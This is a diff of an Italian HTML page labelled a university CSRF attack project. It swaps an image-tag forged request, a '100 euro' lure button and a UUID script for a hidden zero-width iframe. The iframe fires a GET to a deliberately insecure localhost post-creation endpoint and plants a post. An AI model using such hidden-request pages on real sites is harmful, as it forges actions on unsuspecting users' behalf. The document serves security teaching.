@@ -3,40 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ATTACCO CSRF (PROGETTO UNIVERSITA)</title>
+    <title>ATTACCO CSRF - PROGETTO UNIVERSITARIO</title>
 </head>
 <body>
     <h1>FREGATO</h1>
-    <img src="http://localhost/MaSySeNe_Project/api/new-post-insecure.php?id=1234&title=ATTACCO&content=TI+ABBIAMO+FREGATO&img=null" alt="">
-    <a href=""><button>CLICCA QUI PER RICEVERE 100 EURO</button></a>
-<script>
-document.addEventListener('DOMContentLoaded', (event) => {
-    const id = generateUUID();
-    const url ="http://localhost/MaSySeNe_Project/api/new-post-insecure.php?id="+id+"&title=ATTACCO&content=TI+ABBIAMO+FREGATO&img=null";
-    // document.getElementById("gotcha").src=url;
-
-    function generateUUID() {
-      // Public Domain/MIT
-      let d = new Date().getTime(); //Timestamp
-      let d2 =
-        (performance && performance.now && performance.now() * 1000) || 0; //Time in microseconds since page-load or 0 if unsupported
-      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(
-        c
-      ) {
-        let r = Math.random() * 16; //random number between 0 and 16
-        if (d > 0) {
-          //Use timestamp until depleted
-          r = (d + r) % 16 | 0;
-          d = Math.floor(d / 16);
-        } else {
-          //Use microseconds since page-load if supported
-          r = (d2 + r) % 16 | 0;
-          d2 = Math.floor(d2 / 16);
-        }
-        return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
-      });
-    }
-});    
-</script>
+    <iframe src="http://localhost/MaSySeNe_Project/api/new-post-insecure.php?id=5399b0c6-14e1-416c-a833-019bd2a366e8&title=ATTACCO&content=FREGATO&img=null" style="width:0px;" frameborder="0"></iframe>
+    <img src="https://i.etsystatic.com/15971018/r/il/14c008/1957171418/il_570xN.1957171418_r3wl.jpg">
 </body>
 </html>
